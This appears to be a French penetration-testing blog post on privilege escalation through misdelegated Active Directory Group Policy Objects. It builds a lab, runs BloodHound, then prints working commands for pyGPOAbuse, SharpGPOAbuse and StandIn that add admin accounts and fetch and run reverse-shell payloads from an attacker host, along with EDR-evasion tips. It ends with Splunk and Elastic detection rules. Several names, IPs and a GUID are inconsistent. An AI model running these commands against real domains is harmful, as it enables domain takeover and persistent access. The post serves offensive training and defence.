---
title: "Abuse GPO"
date: 2026-03-06T10:00:00+02:00
draft: false
tags: ["pentest", "Active Directory", "PowerView", "reconnaissance", "CRTP", "red team"]
categories: ["Red Team", "pentester"]
summary: ""
showToc: true
tocOpen: true
---
## 1. Introduction

Active Directory (AD) reste, en 2026, le pilier de l'authentification et de l'autorisation dans la majorité des entreprises. Au cœur de cette infrastructure, les **Group Policy Objects (GPO)** offrent aux administrateurs un mécanisme centralisé pour pousser des configurations à des milliers de machines en quelques minutes : déploiement logiciel, scripts de démarrage, paramètres de sécurité, tâches planifiées, modifications de registre, etc.
Cette puissance fait des GPO un vecteur d'attaque redoutable. Une seule délégation mal configurée , un héritage de helpdesk, un oubli post-migration, un script legacy  peut transformer un compte utilisateur sans aucun privilège apparent en **Domain Admin **. Pire encore : l'attaque se déroule via des mécanismes natifs et légitimes du système, ce qui rend la détection extrêmement difficile sans une instrumentation adéquate.

## 2. Comprendre les GPO

Avant d'attaquer une GPO, il faut comprendre intimement ce qu'elle est et comment Windows la traite. Cette section synthétise la documentation officielle Microsoft Learn sous l'angle qui nous intéresse en sécurité offensive : **où se trouvent les données, qui les modifie, quand elles s'exécutent, et avec quels droits**.

### 2.1 Définition officielle

D'après Microsoft, **la stratégie de groupe est une fonctionnalité de Windows qui fournit une gestion centralisée et une configuration des systèmes d'exploitation, des applications et des paramètres utilisateur**. Lorsqu'elle est utilisée avec Active Directory, ses paramètres sont stockés dans un **objet de stratégie de groupe (GPO)** : un ensemble virtuel de paramètres de stratégie, de permissions de sécurité et d'**étendue de gestion (Scope of Management  SOM)** applicable aux utilisateurs et ordinateurs du domaine.
Concrètement, un administrateur peut centraliser :
- **Paramètres système** : règles de pare-feu, gestion de l'alimentation, options de démarrage
- **Sécurité** : politique de mot de passe, restrictions logicielles, déploiement de certificats, droits utilisateur
- **Déploiement** : installation de logiciels MSI, scripts de démarrage/arrêt et de connexion/déconnexion
- **Préférences utilisateur** : redirection de dossiers, mappages de lecteurs, paramètres d'Internet Explorer / Edge
- **Tâches planifiées** : exécutions programmées via les **Group Policy Preferences (GPP)** c'est précisément le mécanisme exploité par pyGPOAbuse, SharpGPOAbuse et StandIn
Microsoft distingue deux grandes catégories de paramètres :

| Catégorie | Cible | Application |

|-----------|-------|-------------|

| **Computer Configuration** | Machine | Au démarrage du système |

| **User Configuration** | Utilisateur | À l'ouverture de session |

  
> **Note** : les paramètres de stratégie liés à l'ordinateur **remplacent** ceux liés à l'utilisateur en cas de conflit. C'est pour cela que les attaques visant des `Computer Tasks` aboutissent à un contexte SYSTEM, contrairement aux `User Scripts` qui s'exécutent sous le token de l'utilisateur connecté.

### 2.2 Architecture technique : GPC + GPT

Tout l'enjeu offensif tient à un fait architectural : **une GPO n'est pas un objet unique mais un couple de deux artefacts physiquement séparés**, qui doivent rester synchronisés.

#### 2.2.1 Le Group Policy Container (GPC)

Le GPC est la partie **stockée dans Active Directory**, dans la partition de domaine sous le chemin LDAP :

```

CN=Policies,CN=System,DC=domain,DC=local

```


Chaque GPO y existe en tant que conteneur identifié par un **GUID unique**, par exemple :

```

CN={4B878AA9-238D-4975-B3A3-B7EE9990F66C},CN=Policies,CN=System,DC=ignite,DC=local

```

Le GPC contient les **métadonnées critiques** de la GPO :

- `versionNumber` : compteur incrémenté à chaque modification (utilisé par les clients pour détecter les changements)

- `gPCFileSysPath` : pointeur UNC vers le SYSVOL (`\\domain\SYSVOL\domain\Policies\{GUID}`)

- `gPCMachineExtensionNames` : liste des CSE (Client-Side Extensions) à exécuter côté machine

- `gPCUserExtensionNames` : équivalent côté utilisateur

- `flags`, `displayName`, `versionNumber`, etc.
  
> **🎯 Point d'attention offensif** : modifier `gPCMachineExtensionNames` permet d'**activer une CSE** (par exemple Restricted Groups via le GUID `{17D89FEC-5C44-4972-B12D-241CAEF74509}`). C'est exactement ce que font les outils d'abus, et c'est aussi un indicateur de très haute fidélité côté défense.
  
#### 2.2.2 Le Group Policy Template (GPT)

Le GPT est la partie **stockée sur le système de fichiers**, dans le partage **SYSVOL** présent sur tous les contrôleurs de domaine :


```

\\domain.local\SYSVOL\domain.local\Policies\{GUID}\

```

Il contient les fichiers de configuration concrets :

| Fichier | Rôle |

|---------|------|

| `GPT.INI` | Métadonnées (version, displayName) |

| `GptTmpl.inf` | Paramètres de sécurité (politique de mot de passe, droits utilisateur, **Restricted Groups**) |

| `Registry.pol` | Modifications de registre (Computer/User) |

| `ScheduledTasks.xml` | Tâches planifiées GPP — **vecteur principal des attaques** |

| `Groups.xml` | Création/modification d'utilisateurs et groupes locaux |

| `Scripts\Startup\` | Scripts exécutés au démarrage de la machine |

| `Scripts\Logon\` | Scripts exécutés à l'ouverture de session utilisateur |

#### 2.2.3 Réplication entre DC
  
Microsoft précise que la cohérence GPC/GPT repose sur **deux mécanismes de réplication indépendants** :

- **AD Replication** : pour le GPC. Réplication typique en moins d'une minute entre DC d'un même site.

- **DFSR (Distributed File System Replication)** : pour le GPT (le SYSVOL). Réplication toutes les **15 minutes** au minimum, pouvant être plus longue entre sites distants.

Cette désynchronisation potentielle (le GPC à jour, le GPT pas encore propagé) explique certains comportements de race condition exploitables, et justifie pourquoi un attaquant peut avoir intérêt à cibler directement le DC qui héberge la version originale de la GPO modifiée.

### 2.3 Étendue d'application (Scope of Management)

Une GPO existante mais non liée n'a aucun effet. Pour produire un effet, elle doit être **liée** (linked) à un conteneur Active Directory. Microsoft identifie trois niveaux possibles :

| Conteneur | Portée | Cas d'usage typique |

|-----------|--------|---------------------|

| **Site** | Toutes les machines du site AD | Paramètres réseau spécifiques à une localisation physique |

| **Domaine (racine)** | Tous les objets du domaine, **DC inclus** | Politique de mot de passe (souvent appliquée ici) |

| **Unité d'Organisation (OU)** | Objets de l'OU et de ses descendants | Cas le plus courant et recommandé |


Microsoft recommande explicitement d'**affecter la plupart des GPO au niveau de l'OU**, et de réserver le niveau domaine aux paramètres globaux justifiés (politique de mot de passe principalement).

> **🎯 Point d'attention offensif** : une GPO liée à la **racine du domaine** ou à l'OU **`Domain Controllers`** s'applique aux contrôleurs de domaine eux-mêmes. Une primitive d'écriture sur ce type de GPO est, fonctionnellement, équivalente à un membership dans `Domain Admins`.

### 2.4 Ordre de traitement : LSDOU

Microsoft documente un ordre de traitement strict, communément appelé **LSDOU** :
1. **L**ocal Group Policy Object (GPO local de la machine)
2. **S**ite GPOs
3. **D**omain GPOs
4. **OU** GPOs (de l'OU parente vers les OU enfants)

Chaque application successive **peut écraser** les paramètres précédents. Le conteneur le plus proche de l'utilisateur ou de l'ordinateur a donc la priorité **par défaut**. 
Deux mécanismes peuvent inverser cette logique :
- **Enforced (Appliqué)** : un lien marqué « appliqué » empêche les GPO de niveau inférieur de l'écraser. Si plusieurs GPO sont marquées Enforced sur un même chemin, c'est le **lien le plus haut** qui prime.
- **Block Inheritance (Bloquer l'héritage)** : configuré sur une OU, il bloque l'application des GPO héritées des niveaux supérieurs. Toutefois, il **ne bloque pas** les GPO marquées Enforced  Enforced bat toujours Block Inheritance.

> **🎯 Point d'attention offensif** : marquer un lien malveillant comme **Enforced** garantit que la charge utile s'applique même si une OU enfant tente de bloquer l'héritage. C'est un raffinement classique des attaques GPO en environnement complexe.

### 2.5 Filtrage : sécurité et WMI

Au-delà du lien, deux mécanismes de **filtrage** déterminent si une GPO s'applique réellement à un utilisateur ou un ordinateur donné :

- **Filtrage de sécurité** : seuls les principaux disposant des permissions **Read** et **Apply Group Policy** sur la GPO la reçoivent effectivement. Par défaut, le groupe `Authenticated Users` dispose de ces deux permissions, ce qui rend la GPO applicable à l'ensemble du domaine.

- **Filtrage WMI** : une requête WMI (par exemple `SELECT * FROM Win32_OperatingSystem WHERE Caption LIKE "%Server%"`) est évaluée sur la machine cible. La GPO s'applique uniquement si la requête retourne `True`.

> **🎯 Point d'attention offensif** : un attaquant disposant de **WriteDacl** sur une GPO peut **modifier le filtrage de sécurité** pour cibler précisément le DC ou un compte privilégié, tout en évitant de déclencher la GPO sur des machines lourdement monitorées (postes administrateur, honeypots, etc.).

### 2.6 Les Client-Side Extensions (CSE)

Microsoft décrit les CSE comme **des composants isolés responsables du traitement des paramètres de stratégie spécifiques fournis par l'infrastructure de stratégie de groupe**. Concrètement : le service Group Policy ne « comprend » pas le contenu d'une GPO, il se contente d'appeler la bonne CSE en fonction de ce qu'il trouve dans `gPCMachineExtensionNames` et `gPCUserExtensionNames`.

Quelques CSE notables, identifiables par leur GUID :

| GUID CSE | Rôle | Pertinence offensive |

|----------|------|----------------------|

| `{35378EAC-683F-11D2-A89A-00C04FBBCFA2}` | Registry | Modifications du registre |

| `{827D319E-6EAC-11D2-A4EA-00C04F79F83A}` | Security | **Active GptTmpl.inf** |

| `{17D89FEC-5C44-4972-B12D-241CAEF74509}` | Restricted Groups | **Ajout d'admins locaux persistants** |

| `{AADCED64-746C-4633-A97C-D61349046527}` | Scheduled Tasks (GPP) | **Vecteur n°1 des attaques** |

| `{42B5FAAE-6536-11D2-AE5A-0000F87571E3}` | Scripts | Startup / Shutdown / Logon / Logoff |

L'apparition d'un de ces GUID dans `gPCMachineExtensionNames` alors qu'il était absent auparavant est l'un des **indicateurs défensifs les plus fiables** d'une modification suspecte  nous y reviendrons en section détection.

### 2.7 Cycle d'application

Microsoft documente précisément les fenêtres temporelles d'application :
- **Application initiale (foreground processing)** :
  - Au **démarrage de l'ordinateur** pour les paramètres Computer
  - À l'**ouverture de session** pour les paramètres User
  - Peut être synchrone (l'OS attend la fin de l'application) ou asynchrone

- **Actualisation périodique (background refresh)** :
  - **Postes de travail et serveurs membres** : toutes les **90 minutes**, avec un jitter aléatoire **jusqu'à 30 minutes**
  - **Contrôleurs de domaine** : toutes les **5 minutes**
  - Tout traitement doit s'achever en moins de **60 minutes** (timeout non modifiable)

- **Forçage manuel** :
  - `gpupdate /force` en local
  - `Invoke-GPUpdate` via PowerShell, y compris à distance
  - `Remote Group Policy Update` via la console GPMC sur une OU entière

> **🎯 Implication offensive** : une modification poussée à 10h00 sur une GPO appliquée aux DC sera potentiellement exécutée **avant 10h05** sur tous les contrôleurs du domaine, sans aucune action complémentaire de l'attaquant. C'est cette latence très courte qui fait des GPO un vecteur de privilège escalation aussi efficace.

### 2.8 Les DACL : qui peut faire quoi sur une GPO
  
Chaque GPO, comme tout objet Active Directory, est protégée par une **Discretionary Access Control List (DACL)** qui définit les droits accordés à chaque principal (utilisateur, groupe, ordinateur). C'est précisément la couche dont l'audit est généralement négligé  et c'est sur elle que repose toute l'attaque.

Les permissions critiques pour un attaquant sont :
  
- **GenericAll** : contrôle total (équivaut à être propriétaire)
- **GenericWrite** : écriture sur l'objet et ses attributs (suffisant pour modifier `gPCMachineExtensionNames` et le contenu SYSVOL)
- **WriteDacl** : modification de la DACL elle-même → permet l'**auto-élévation** en s'octroyant `GenericAll`
- **WriteOwner** : prise de propriété, qui débloque ensuite tous les autres droits
- **WriteProperty** ciblé sur `gPCFileSysPath` ou `gPCMachineExtensionNames` : suffisant pour la plupart des techniques GPO

Dans la console GPMC, ces permissions se traduisent par les rôles affichés dans l'onglet **Délégation** :

| Rôle GPMC | Permissions effectives | Risque |

|-----------|------------------------|--------|

| Read | Read | Faible |

| Edit settings | Read + Write | **Critique** |

| **Edit settings, delete, modify security** | Full Control | **Maximum (équivaut à GenericAll)** |

| Read (from Security Filtering) | Read + Apply Group Policy | Légitime |

Toute permission équivalente à **« Edit settings, delete, modify security »** sur une GPO liée à un conteneur sensible suffit à compromettre tous les ordinateurs visés par cette GPO  y compris les contrôleurs de domaine.

### 2.9 Synthèse : surface d'attaque d'une GPO

Pour conclure cette section, voici la cartographie complète de la surface d'attaque d'une GPO, vue côté offensif :

  

```

┌────────────────────────────────────────────────────────────┐

│                       CIBLE : GPO                          │

└────────────────────────────────────────────────────────────┘

            │

            ├──► GPC (LDAP)

            │     ├─ gPCFileSysPath ............ pointeur SYSVOL

            │     ├─ gPCMachineExtensionNames .. activation CSE

            │     ├─ versionNumber ............. trigger de refresh

            │     └─ DACL ...................... vecteur d'auto-promotion

            │

            ├──► GPT (SYSVOL)

            │     ├─ ScheduledTasks.xml ........ payload n°1 (GPP)

            │     ├─ GptTmpl.inf ............... Restricted Groups (persistance)

            │     ├─ Groups.xml ................ création d'utilisateurs

            │     ├─ Registry.pol .............. modifications registre

            │     └─ Scripts\Startup\Logon\ .... exécution de code arbitraire

            │

            ├──► Lien (OU/Domain/Site)

            │     ├─ Enforced ................. contournement de Block Inheritance

            │     └─ Link Order ............... priorité d'application

            │

            └──► Filtrage

                  ├─ Security Filtering ........ ciblage par compte/groupe

                  └─ WMI Filtering ............. ciblage conditionnel

```



L'attaquant a besoin d'**une seule** primitive d'écriture (parmi les permissions critiques) sur **n'importe lequel** de ces composants pour compromettre toutes les machines auxquelles la GPO s'applique. C'est cette densité de surface qui rend le sujet aussi dangereux  et aussi instructif à étudier.

---
## 3. Pourquoi les GPO sont une cible privilégiée

### 3.1 L'asymétrie risque/privilège

Les GPO concentrent une asymétrie redoutable : un compte avec **zéro privilège AD apparent** (ni Domain Admin, ni Enterprise Admin, ni membre d'aucun groupe sensible) peut, via une simple permission `WriteDacl` sur une GPO, exécuter du **code arbitraire en SYSTEM** sur tous les ordinateurs où la GPO s'applique. Y compris les contrôleurs de domaine si la GPO est liée à la racine ou à l'OU `Domain Controllers`.

### 3.2 Les sources courantes de misconfigurations

Dans la pratique, les délégations excessives proviennent de plusieurs sources :
- **Helpdesk over-delegation** : pour faciliter le support, on accorde des droits d'édition à des comptes opérationnels qui n'en ont pas besoin
- **Migrations historiques** : permissions héritées d'environnements anciens, jamais nettoyées
- **Scripts d'installation** : produits tiers qui modifient les ACL sans documentation claire
- **Délégation par OU** : un admin de filiale obtient des droits sur une GPO liée plus haut que nécessaire
- **Comptes de service** : utilisés par des outils de déploiement et oubliés

### 3.3 Furtivité de l'attaque

Une fois la primitive d'écriture obtenue, l'exécution passe par des mécanismes **100% légitimes** :
- Le Group Policy Client est un service signé Microsoft
- Les Scheduled Tasks créées via GPP sont une fonctionnalité native
- Les scripts de démarrage existent dans tout déploiement AD
Sans télémétrie spécifique (audit LDAP, monitoring SYSVOL, EDR comportemental), l'attaque ne génère aucune alerte évidente.
---

## 4. Mise en place du Lab vulnérable

Notre lab reproduit un environnement minimaliste mais représentatif :

```

┌─────────────────────────────────┐

│  DC.nyoma.local                 │

│  Windows Server 2019            │

│  IP : 192.168.17.144            │

│  Domaine : nyoma.local          │

└─────────────────────────────────┘

              │

              │ LAN

              │

┌─────────────────────────────────┐

│  Kali Linux (attaquant)         │

│  IP :              │

│  Outils : BloodHound,           │

│  pyGPOAbuse, evil-winrm         │

└─────────────────────────────────┘

```

### 4.2 Création de l'utilisateur compromis

Sur le DC, on crée un compte standard simulant le foothold initial :

```Powershell

New-ADUser -Name "larass" -SamAccountName "larass" -AccountPassword (ConvertTo-SecureString "Password@1" -AsPlainText -Force) -Enabled $true

Add-ADGroupMember -Identity "Utilisateurs de gestion à distance" -Members larass

```

Le compte **`larass`** est volontairement membre du groupe **Utilisateurs de gestion à distance** sur le DC : cela permet l'accès WinRM, mais sans aucun privilège élevé. C'est un scénario réaliste où un compte technique se retrouve avec un peu trop d'accès.

![Texte alternatif](/images/20260427150449.png)

### 4.3 Création de la GPO vulnérable

**Créez un objet de stratégie de groupe** (GPO) sur le contrôleur de domaine avec  **des droits de modification délégués à larass**  (simulant des erreurs de configuration réelles dues à une délégation excessive de pouvoirs par le service d'assistance ou à des scripts hérités).

![Texte alternatif](/images/20260427151439.png)

![Texte alternatif](/images/20260427151609.png)

![Texte alternatif](/images/20260427152028.png)

Cette permission équivaut à **GenericAll** sur la GPO. C'est exactement le type de délégation qu'on retrouve dans les environnements réels où le helpdesk obtient un accès "pour pouvoir aider rapidement".
À ce stade, le lab est armé. Côté attaquant, on bascule sur Kali.

> **💡 Note** : Lier la GPO à la racine du domaine est un choix pédagogique pour maximiser l'impact. En production, on devrait lier au plus bas niveau possible.

## 5. Énumération et reconnaissance

### 5.1 Vérification du foothold
Avant tout, on confirme le contexte du compte compromis :

```bash

# Depuis Kali, avec impacket installé

net rpc user -U "nyoma.local\larass%Password@1" -S 192.168.17.144

```

On peut aussi enumérer rapidement avec `net user` côté Windows :

```cmd

net user larass /domain

```

![Texte alternatif](/images/20260427152946.png)

![Texte alternatif](/images/20260427153230.png)

Le retour confirme : `larass` est dans **Domain Users** et **Remote Management Users**. Aucun groupe sensible. Sur le papier, le compte est sans intérêt.

### 5.2 BloodHound : le révélateur

C'est ici que tout change. **BloodHound** cartographie les relations dans Active Directory et révèle les chemins d'attaque cachés.

#### 5.2.1 Collecte des données

L'option `-c all` lance toutes les méthodes de collecte, dont **ACL** et **ObjectProps**, indispensables pour révéler les permissions sur les GPO.

```Bash
bloodhound-python -u larass -p 'Password@1' -ns 192.168.17.144 -d nyoma.local -c all
```

![Texte alternatif](/images/20260427153800.png)

![Texte alternatif](/images/20260427154010.png)

![Texte alternatif](/images/20260427154218.png)

Sur le nœud `larass`, on observe trois arêtes vers `VULN GPO@NYOMA.LOCAL` :
- **GenericWrite**
- **WriteDacl**
- **WriteOwner**
N'importe laquelle suffit à compromettre la GPO.

### 5.3 Extraction du GUID

![Texte alternatif](/images/20260427154742.png)

BloodHound affiche le **Distinguished Name** de la GPO dans le panneau d'information :

```

CN={56588E29-AB4B-4195-AFB0-489D5CEF5BC9},CN=POLICIES,CN=SYSTEM,DC=NYOMA,DC=LOCAL

```

Le GUID **`56588E29-AB4B-4195-AFB0-489D5CEF5BC9`** sera l'identifiant transmis aux outils d'exploitation pour cibler précisément les fichiers SYSVOL associés.

---
## 6. Preuves de Concept

### 6.1 pyGPOAbuse — Création d'un admin local depuis Linux

**pyGPOAbuse** est un outil Python qui, à partir d'un compte avec droits d'écriture sur une GPO, injecte une **Immediate Scheduled Task** dans le fichier `ScheduledTasks.xml` du SYSVOL. Au prochain refresh, la tâche s'exécute en SYSTEM sur toutes les machines ciblées.

#### 6.1.1 Installation

```bash

git clone https://github.com/Hackndo/pyGPOAbuse.git
cd pyGPOAbuse
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

```

#### 6.1.2 Exploitation

```bash

python pygpoabuse.py nyoma.local/larass:'Password@1' \
  -gpo-id "56588E29-AB4B-4195-AFB0-489D5CEF5BC9" \
  -dc-ip 192.168.17.144

```

Par défaut, l'outil crée un compte local administrateur avec les credentials :
- **Login** : `john`
- **Password** : `H4x00r123..`

![Texte alternatif](/images/20260427160019.png)

Sortie attendue :

```
[+] ScheduledTask TASK_3a78d074 created!
```

#### 6.1.3 Vérification du payload sur le DC
Sur le DC,
On voit `TASK_53b7de02` avec l'action :

```

cmd.exe /c "net user john H4x00r123.. /add && net localgroup administrators john /add"

```

![Texte alternatif](/images/20260427160505.png)

![Texte alternatif](/images/20260427160550.png)

#### 6.1.4 Validation côté attaquant

![Texte alternatif](/images/20260427162352.png)

Après le refresh GPO (ou un `gpupdate /force`), on se connecte en tant que `john` sur le DC :

```bash

evil-winrm -i 192.168.1.11 -u john -p 'H4x00r123..'

```

Une fois la session ouverte :

```powershell

whoami /priv

```

![Texte alternatif](/images/20260427162513.png)

On observe les privilèges complets d'un local admin :
- `SeDebugPrivilege`
- `SeImpersonatePrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeTakeOwnershipPrivilege`
- `SeLoadDriverPrivilege`

À partir de là, dump du `NTDS.dit`, extraction du hash `krbtgt`, forge de Golden Ticket  la suite est connue.
### 6.2 pyGPOAbuse — Reverse Shell PowerShell
Au lieu de créer un compte, on peut faire exécuter un payload arbitraire.

#### 6.2.1 Génération du payload

Sur **revshells.com**, configurer :

- IP : `attaquant`
- Port : `1234`
- Type : **PowerShell #3 (Base64)**

Sauvegarder le résultat dans `run.txt` puis servir :

```bash

python3 -m http.server 80

```

#### 6.2.2 Listener

```bash

rlwrap nc -lvnp 1234

```

#### 6.2.3 Injection via pyGPOAbuse


```bash

python pygpoabuse.py nyoma.local/larass:'Password@1' \

  -gpo-id "6588E29-AB4B-4195-AFB0-489D5CEF5BC9" \

  -powershell \

  -command "IEX(New-Object Net.WebClient).DownloadString('http://ip attaquant/run.txt')"

```

Au refresh GPO, le DC télécharge `run.txt`, décode le Base64 et exécute le reverse shell. Le listener reçoit alors un shell **NT AUTHORITY\SYSTEM**.

### 6.3 SharpGPOAbuse — Startup Script (depuis Windows)

Lorsque l'attaquant a déjà un foothold Windows (ici via WinRM), **SharpGPOAbuse** est plus naturel : c'est un binaire .NET qui s'exécute sous le token de l'utilisateur compromis.

#### 6.3.1 Upload du binaire

```bash

evil-winrm -i 192.168.17.144 -u larass -p 'Password@1'

```

Dans la session :

```powershell

upload /root/Tools/SharpGPOAbuse.exe

```

#### 6.3.2 Génération du payload HTA

Côté Kali :

```bash

msfvenom -p windows/x64/shell_reverse_tcp \

  LHOST=192.168.17.144 LPORT=4443 \

  -f hta-psh > file.hta


python3 -m http.server 80

```

#### 6.3.3 Injection du startup script

Dans la session WinRM :

```powershell

.\SharpGPOAbuse.exe --AddUserScript \

  --ScriptName Startup.bat \

  --ScriptContents "mshta http://192.168.17.144/file.hta" \

  --GPOName "VULN GPO"

```

Le shell reçu sera dans le **contexte de l'utilisateur** qui se connecte (souvent l'administrateur du domaine sur le DC), pas en SYSTEM.

### 6.4 SharpGPOAbuse — Computer Task (SYSTEM)

Pour obtenir directement un shell SYSTEM, on cible une tâche planifiée niveau machine :

```powershell

.\SharpGPOAbuse.exe --AddComputerTask \

  --TaskName "System-Update" \

  --Author "nyoma\administrateurs" \

  --Command "powershell" \

  --Arguments "mshta http://192.168.17.144/file.hta" \

  --GPOName "VULN GPO"

```

L'argument `--Author "ignite\administrator"` est cosmétique mais efficace : la tâche apparaît comme créée par un admin légitime, ce qui peut tromper un audit superficiel.

Listener :

```bash

rlwrap nc -lvnp 4444

```

Au refresh, on reçoit un shell `nt authority\system` sur le DC.

### 6.5 SharpGPOAbuse — Persistance via Restricted Groups

Les reverse shells meurent au reboot. Pour une persistance durable, on injecte directement un compte dans le groupe **Administrators** local de toutes les machines visées :

```powershell

.\SharpGPOAbuse.exe --AddLocalAdmin \

  --UserAccount larass \

  --GPOName "VULN GPO"

```

L'outil utilise la fonctionnalité native **Restricted Groups** des GPO. Après `gpupdate /force` :

```powershell

net localgroup administrators

```

`raj` apparaît désormais dans la liste des admins locaux du DC. Cette persistance survit aux reboots et à la plupart des nettoyages superficiels.

### 6.6 StandIn — Évasion et alternative furtive

Les EDR récents signent **SharpGPOAbuse** sur ses hashs binaires, ses strings, et même ses options de ligne de commande. **StandIn** implémente les mêmes primitives dans une codebase .NET totalement différente.

#### 6.6.1 Upload

```powershell

upload /root/Tools/StandIn_v13_Net45.exe

```

#### 6.6.2 Computer Task SYSTEM


```powershell

.\StandIn_v13_Net45.exe --gpo \

  --filter "VULN GPO" \

  --tasktype computer \

  --taskname Badtask \

  --author "IGNITE\Administrator" \

  --command "powershell" \

  --args "mshta http://192.168.17.144/file.hta"

```


Notez l'option `--filter` qui cible par **nom d'affichage** plutôt que par GUID — plus rapide en pratique.


#### 6.6.3 Multi-GPO

Si l'on dispose de plusieurs comptes compromis sur plusieurs GPO vulnérables, on peut multiplier les points d'ancrage :

```powershell

# Avec un autre compte (sanjeet) sur une autre GPO

.\StandIn_v13_Net45.exe --gpo --filter "VULN-GPO1" --localadmin sanjeet

```


Ce pattern — plusieurs comptes, plusieurs GPO, plusieurs tools — est le mode opératoire d'un adversaire mature qui veut survivre à un nettoyage partiel. 

---

## 7. Outils utilisés

  

| Outil | Fonction | Plateforme | Lien |

|-------|----------|------------|------|

| **BloodHound.py** | Collecte ACL et chemins d'attaque | Linux | [github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py) |

| **BloodHound CE** | Visualisation des graphes | Linux/Windows | [github.com/SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) |

| **pyGPOAbuse** | Exploitation GPO depuis Linux | Linux | [github.com/Hackndo/pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) |

| **SharpGPOAbuse** | Exploitation GPO depuis Windows | Windows | [github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) |

| **StandIn** | Alternative .NET furtive | Windows | [github.com/FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn) |

| **evil-winrm** | Shell WinRM | Linux | [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm) |

| **msfvenom** | Génération de payloads | Linux | Metasploit Framework |

| **rlwrap / netcat** | Listeners interactifs | Linux | Standard |

| **PingCastle** | Audit AD défensif | Windows | [pingcastle.com](https://www.pingcastle.com/) |

| **Purple Knight** | Audit AD défensif | Windows | [semperis.com](https://www.semperis.com/purple-knight/) |

  

---


## 8. Détection et prévention

#### 8.1.1 Principe du moindre privilège sur les délégations

Toutes les GPO doivent être auditées régulièrement. La permission **"Edit settings, delete, modify security"** ne doit appartenir qu'aux groupes :
- `Group Policy Creator Owners`
- `Domain Admins`
- `Enterprise Admins`

#### 8.1.2 Modèle de tiering
Aligner la délégation sur le modèle Microsoft Tier 0 / 1 / 2 :
- **Tier 0** : DC, GPO appliquées aux DC, comptes admin du domaine
- **Tier 1** : serveurs membres
- **Tier 2** : postes utilisateurs
Aucun compte Tier 1 ou Tier 2 ne doit avoir de droit d'écriture sur une GPO Tier 0. L'appartenance au groupe `Remote Management Users` sur les DC doit être gérée par **PIM/JIT** (élévation à la demande), jamais permanente.

#### 8.1.3 Restreindre la portée des liens

Une GPO doit être liée au **niveau le plus bas possible** qui satisfait son objectif. Les liens à la racine du domaine doivent être justifiés et exceptionnels.

#### 8.1.4 LAPS

Le déploiement de **Local Administrator Password Solution (LAPS)** rend l'ajout massif d'un compte local administrateur beaucoup moins exploitable : chaque machine a un mot de passe local unique et rotatif.

### 8.2 Détection avec Splunk

#### 8.2.1 Sources de données nécessaires

- **Windows Security Event Log** (DC) — Event ID 5136 activé via "Audit Directory Service Changes"
- **File Integrity Monitoring** sur `\\domain.local\SYSVOL\domain\Policies\`
- **Sysmon** sur les DC et postes admin

#### 8.2.2 Activation de l'audit LDAP

Sur les DC, configurer la GPO `Default Domain Controllers Policy` :

```

Computer Configuration → Policies → Windows Settings → Security Settings →

Advanced Audit Policy Configuration → DS Access → Audit Directory Service Changes : Success

```

Puis activer le SACL sur les conteneurs GPO via `dsacls` ou ADSI Edit.

#### 8.2.3 Règles SPL

**Détection 1 : Modification d'attribut critique sur GPO**

```spl

index=wineventlog source="WinEventLog:Security" EventCode=5136

| eval AttrName=mvindex(LdapDisplayName,0)

| search AttrName IN ("gPCMachineExtensionNames","gPCUserExtensionNames","versionNumber","gPCFileSysPath")

| search ObjectDN="*CN=Policies,CN=System*"

| where NOT (SubjectUserName IN ("Administrator","SYSTEM") AND

             SubjectDomainName="IGNITE")

| stats count by _time, SubjectUserName, ObjectDN, AttrName, AttributeValue

```


**Détection 2 : Apparition de Restricted Groups CSE GUID**

Le GUID `{827D319E-6EAC-11D2-A4EA-00C04F79F83A}` correspond à l'extension client-side **Security**, et `{17D89FEC-5C44-4972-B12D-241CAEF74509}` à **Restricted Groups**. Leur ajout à `gPCMachineExtensionNames` est un indicateur de très haute fidélité.

```spl

index=wineventlog source="WinEventLog:Security" EventCode=5136

LdapDisplayName="gPCMachineExtensionNames"

AttributeValue="*17D89FEC-5C44-4972-B12D-241CAEF74509*"

| table _time, SubjectUserName, ObjectDN, AttributeValue

```


**Détection 3 : ScheduledTasks.xml créé/modifié dans SYSVOL**


```spl

index=sysmon EventCode=11

TargetFilename="*\\SYSVOL\\*\\Policies\\*\\ScheduledTasks.xml"

| table _time, host, Image, TargetFilename, User

```

**Détection 4 : Pattern BloodHound (énumération bulk LDAP)**

```spl

index=wineventlog source="WinEventLog:Security" EventCode=4662

| stats count dc(ObjectName) as unique_objects by SubjectUserName, src_ip

| where count > 500 AND unique_objects > 100

```

### 8.3 Détection avec Elastic / ECS

#### 8.3.1 Sources

- **Winlogbeat** ou **Elastic Agent** avec module `system` sur DC

- **Auditbeat** pour FIM sur SYSVOL

- **Elastic Defend** (EDR) pour la détection comportementale

#### 8.3.2 Règles KQL/EQL

**Règle 1 : Modification de gPCMachineExtensionNames**


```

event.code: "5136" and

winlog.event_data.LdapDisplayName: "gPCMachineExtensionNames" and

winlog.event_data.ObjectDN: *CN=Policies* and

not winlog.event_data.SubjectUserName: ("Administrator" or "SYSTEM")

```


**Règle 2 : Création de fichier suspect dans SYSVOL (EQL)**


```eql

file where event.action == "creation" and

file.path: "*\\SYSVOL\\*\\Policies\\*" and

(file.name in ("ScheduledTasks.xml", "GptTmpl.inf", "Groups.xml") or

 file.path: "*\\Scripts\\Startup\\*")

```

  

**Règle 3 : mshta.exe lancé depuis un script de démarrage GPO (EQL)**

  

```eql

process where process.name == "mshta.exe" and

process.parent.name in ("cscript.exe", "wscript.exe", "cmd.exe") and

process.parent.parent.name == "userinit.exe"

```

  

**Règle 4 : PowerShell encodé descendant du Task Scheduler**

  

```eql

process where process.name == "powershell.exe" and

process.command_line: "*-EncodedCommand*" and

process.parent.name == "svchost.exe" and

process.parent.args: "*Schedule*"

```

  

#### 8.3.3 Dashboards à construire


- **GPO Modifications Timeline** : graphe temporel des Event 5136 sur les conteneurs Policies

- **SYSVOL File Activity** : heatmap des fichiers modifiés par GPO et par auteur

- **Suspicious Process Tree** : arbres de processus issus de Task Scheduler avec scoring


### 8.4 Mesures complémentaires

#### 8.4.1 Désactivation des GPP Scheduled Tasks

